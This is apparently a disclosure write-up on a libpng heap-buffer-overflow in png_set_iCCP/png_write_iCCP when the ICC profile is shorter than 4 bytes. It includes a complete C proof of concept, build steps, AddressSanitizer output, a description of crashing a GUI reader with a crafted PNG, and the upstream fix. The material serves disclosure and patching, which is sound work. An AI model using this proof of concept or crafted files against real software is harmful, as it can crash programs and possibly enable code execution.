# heap-buffer-overflow opportunity in png_set_iCCP() / png_write_iCCP()

From issue [#648](https://github.com/pnggroup/libpng/issues/648) we got that if the allocation size of the 'profile' argument passed to png_write_iCCP() is less than 4 bytes, there is a heap overflow that occurs in `pngwutil.c` at line [1151](https://github.com/Rodrigue2g/libpng/blob/c4b20d0a3a7a53a0480a4c21c68b2c1794512629/pngwutil.c#L1151):

```c
   /* These are all internal problems: the profile should have been checked
    * before when it was stored.
    */
   if (profile == NULL)
      png_error(png_ptr, "No profile for iCCP chunk"); /* internal error */

   profile_len = png_get_uint_32(profile);

   if (profile_len < 132)
      png_error(png_ptr, "ICC profile too short");
```
Here, png_write_iCCP uses the length from the first four bytes of the profile set by png_set_iCCP rather than the actual data length recored by png_set_iCCP. This results in a read-beyond-end-of-malloc bug (at `profile_len = png_get_uint_32(profile);`) if the profile data is less than 4 bytes long.

With the following [POC](poc_iccp.c), we managed to reproduce the bug:
```c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "png.h"

int main() {
    FILE *fp = fopen("output.png", "wb");
    if (!fp) {
        perror("fopen");
        return 1;
    }

    png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING,
                                                  NULL, NULL, NULL);
    if (!png_ptr) return 1;

    png_infop info_ptr = png_create_info_struct(png_ptr);
    if (!info_ptr) {
        png_destroy_write_struct(&png_ptr, NULL);
        return 1;
    }

    if (setjmp(png_jmpbuf(png_ptr))) {
        fprintf(stderr, "libpng triggered an error (likely due to bad profile)\n");
        png_destroy_write_struct(&png_ptr, &info_ptr);
        fclose(fp);
        return 1;
    }

    png_init_io(png_ptr, fp);
    png_set_IHDR(png_ptr, info_ptr,
                 1, 1, 8, PNG_COLOR_TYPE_RGB,
                 PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_BASE, PNG_FILTER_TYPE_BASE);

    /**
     * Malformed iCC profile (3 bytes instead of >= 4)
     */
    const char profile_name[] = "sRGB";
    const png_charp profile_data = (png_charp)"ABC";
    png_uint_32 profile_len = 3;
    int compression_type = 0;

    /**
     * The root cause of the vulnerability starts here,
     * when we set the malicious profile (iCC profile less than 4 bytes)
     */
    png_set_iCCP(png_ptr, info_ptr,
                 profile_name, compression_type,
                 profile_data, profile_len);

    /**
     * The entry point to trigger the vulnerability is here,
     * when we write the informations of the png file.
     */
    png_write_info(png_ptr, info_ptr);
    /**
     * which calls:
     * png_write_info_before_PLTE(png_ptr, info_ptr);
     * that then calls:
     * png_write_iCCP(png_ptr, info_ptr->iccp_name, info_ptr->iccp_profile);
     */
    

    /**
     * The rest is what one would typically do to write a png image.
     */
    png_bytep row = (png_bytep)malloc(3);
    memset(row, 255, 3);
    png_write_row(png_ptr, row);
    png_write_end(png_ptr, NULL);

    free(row);
    png_destroy_write_struct(&png_ptr, &info_ptr);
    fclose(fp);
    return 0;
}
```

After building the vulnerable version of the library (from this branch):

```
$ ./configure
$ make
$ sudo make install
```

We can build the exec:
```sh
$ gcc -fsanitize=address -g poc_iccp.c -o poc_iccp -lpng -lz
```

Once we run the exec (with address sanatizer enabled), we get the following output:

```sh
$ ./poc_iccp

=================================================================
==97234==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000000b3 at pc 0x000100b5eda8 bp 0x00016fba6cc0 sp 0x00016fba6470
READ of size 65536 at 0x6020000000b3 thread T0
    #0 0x100b5eda4 in memcpy+0x3fc (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x52da4)
    #1 0x19ca8f774  (libz.1.dylib:arm64e+0x6774)
    #2 0x19ca8da88  (libz.1.dylib:arm64e+0x4a88)
    #3 0x19ca8f088  (libz.1.dylib:arm64e+0x6088)
    #4 0x19ca8c7a0 in deflate+0x958 (libz.1.dylib:arm64e+0x37a0)
    #5 0x1002c3dc8 in png_text_compress pngwutil.c:597
    #6 0x1002c3b74 in png_write_iCCP pngwutil.c:1188
    #7 0x1002bf7b0 in png_write_info_before_PLTE pngwrite.c:199
    #8 0x1002bf8e0 in png_write_info pngwrite.c:237
    #9 0x10025ba24 in main poc_iccp.c:55
    #10 0x18ebe4270  (<unknown module>)

0x6020000000b3 is located 0 bytes after 3-byte region [0x6020000000b0,0x6020000000b3)
allocated by thread T0 here:
    #0 0x100b60c04 in malloc+0x94 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x54c04)
    #1 0x1002abcf0 in png_malloc_warn pngmem.c:216
    #2 0x1002bda1c in png_set_iCCP pngset.c:891
    #3 0x10025b9b0 in main poc_iccp.c:47
    #4 0x18ebe4270  (<unknown module>)

SUMMARY: AddressSanitizer: heap-buffer-overflow (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x52da4) in memcpy+0x3fc
Shadow bytes around the buggy address:
  0x601ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x602000000000: fa fa fd fa fa fa fd fd fa fa fd fd fa fa 00 00
=>0x602000000080: fa fa 05 fa fa fa[03]fa fa fa fa fa fa fa fa fa
  0x602000000100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==97234==ABORTING
```

## Minimal "real-life" example
In [vulnerable-png-reader.c](vulnerable-png-reader.c) you can find a very basic png reader that lets a user select an image to display. It simulates what an actual programm would do to write back the png (for example if it where to modify it) by calling png_set_iCCP (if the original image contains an iCCP chunk). In order to trigger this vulnerability here, you can create a [malicious png](generate_bad_iccp_png.py) with:
```sh
$ python3 create_malformed_iccp_png.py
```
Make sure you have gtk+3 installed first (`$ brew install gtk+3` on macOS) and that you have built the vulnearable version of libpng (like before). You can then build and run this POC:
```sh
$ gcc vulnerable-png-reader.c -o png_gui \
  `pkg-config --cflags gtk+-3.0` \
  `pkg-config --libs gtk+-3.0` \
  -lpng

$ ./png_gui
```

You can then either upload a valid png that will be correctly displayed, or malformed_iccp.png which will crash the programm. 
A more sophisticatedly crafted png could possibly hijack the control flow leading to a potential RCE.

## Proposed fix
Of course there are some obious mitigations to this bug that the carefull programmer should have already implemented.
The first, most straight-forward one (although it might not be sufficient to cover all cases) is to wrapp the call to `png_set_iCCP` in `png_get_iCCP` or `png_get_valid`:
```c
if (png_get_valid(png_ptr, info_ptr, PNG_INFO_iCCP)) {
    // The iCCP chunk is valid
    png_set_iCCP(write_ptr, write_info, name, compression, profile, len);
} else {
    // The iCCP chunk is invalid
}
// Or 
if (png_get_iCCP(png_ptr, info_ptr, &name, &compression, &profile, &len);) {
  png_set_iCCP(write_ptr, write_info, name, compression, profile, len);
}
```
Then, a more reliable fix is the one now implemented in the libpng library:
```c
png_write_iCCP(png_structrp png_ptr, png_const_charp name,
-              png_const_bytep profile)
+              png_const_bytep profile, png_uint_32 profile_len)
{
...

- png_uint_32 profile_len;

...

- profile_len = png_get_uint_32(profile);

...

+ if (png_get_uint_32(profile) != profile_len)
+   png_error(png_ptr, "Incorrect data in iCCP");

...
}
```

Where png_write_iCCP doesn't use the first four bytes of the ICC profile data to determine the profile_len anymore. Instead, it uses the actual data length with the explicit profile_len value provided to png_set_iCCP.
